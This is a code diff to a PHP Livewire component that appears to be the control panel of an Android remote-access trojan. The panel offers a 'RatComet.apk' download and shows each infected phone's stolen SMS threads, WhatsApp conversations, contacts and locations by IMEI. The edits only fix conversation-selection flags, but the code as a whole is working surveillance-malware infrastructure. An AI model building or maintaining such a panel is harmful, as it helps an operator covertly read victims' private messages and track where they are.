@@ -26,6 +26,7 @@ class Home extends Component
     public $smsList = [];
     public $smsConversationList = [];
     public $selectedSmsConversation;
+    private $skipFirstSms = 0;
 
     public $appsList = [];
     public $contactList = [];
@@ -37,7 +38,7 @@ class Home extends Component
     public $whatsappList = [];
     public $whatsappConversationList = [];
     public $selectedWhatsappConversation;
-    private $skipFirst = 0;
+    private $skipFirstWhatsapp = 0;
 
     public function showWhatsapp() {
         $this->resetChoice();
@@ -47,7 +48,7 @@ class Home extends Component
         return Storage::download('public/mobile/RatComet.apk', "RatComet.apk",['Content-Type'=>'application/vnd.android.package-archive','Content-Disposition'=>'attachment;filename="RatComet.apk"',]);
     }
     public function showWhatsappConversation($contact) {
-        $this->skipFirst = 1;
+        $this->skipFirstWhatsapp = 1;
         $this->selectedWhatsappConversation = $contact;
         $this->whatsappConversationList = SocialApp::orderBy('position','ASC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $contact])->get();
     }
@@ -56,6 +57,7 @@ class Home extends Component
         $this->menu = '1';
     }
     public function showSmsConversation($contact) {
+        $this->skipFirstSms = 1;
         $this->selectedSmsConversation = $contact;
         $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
     }
@@ -136,11 +138,14 @@ class Home extends Component
         $this->phoneList = $tmphones;
 
         if($this->menu == '1'){
-            $this->smsList = Sms::latest('date')->where('imei',$this->phoneImei)->get()->unique('contact');
-            if($this->smsList->count() != 0) {
-                $this->selectedSmsConversation = $this->smsList->toArray()[0]["contact"];
-                $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
+            if($this->skipFirstSms == 0)  {
+                $this->smsList = Sms::latest('date')->where('imei',$this->phoneImei)->get()->unique('contact');
+                if($this->smsList->count() != 0) {
+                    $this->selectedSmsConversation = $this->smsList->toArray()[0]["contact"];
+                    $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
+                }
             }
+        
         }else if($this->menu == '2'){
             $this->contactList = Contact::where('imei',$this->phoneImei)->get();
 
@@ -154,7 +159,7 @@ class Home extends Component
             $this->locationList = Location::where('imei',$this->phoneImei)->pluck('latitude','longitude')->toArray();
 
         }else if($this->menu == '7') {
-            if($this->skipFirst == 0) {
+            if($this->skipFirstWhatsapp == 0) {
                 $this->whatsappList = SocialApp::orderBy('position','DESC')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp'])->get()->unique('contact')->sortByDesc('currentDate');
                 if($this->whatsappList->count() != 0){
                     $this->selectedWhatsappConversation = $this->whatsappList->first()->contact;
